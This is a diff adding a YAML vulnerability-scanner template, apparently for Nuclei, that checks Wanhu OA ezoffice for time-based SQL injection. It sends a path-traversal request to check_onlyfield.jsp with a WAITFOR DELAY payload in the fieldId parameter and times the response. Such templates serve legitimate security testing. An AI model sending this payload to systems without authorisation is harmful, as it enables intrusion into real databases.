@@ -1,0 +1,37 @@
+id: poc-yaml-whir-oa-check-onlyfield-sqli
+info:
+  name: 万户OA check_onlyfield SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 万户OA ezoffice
+
+variables:
+  random: '{{rand_int(5,8)}}'
+  random1: '{{to_number(random) + 1}}'
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:{{random}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          - "SESSIONID"
+      - type: word
+        part: body
+        words:
+          - ""
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration > to_number(random) && duration < to_number(random1)'
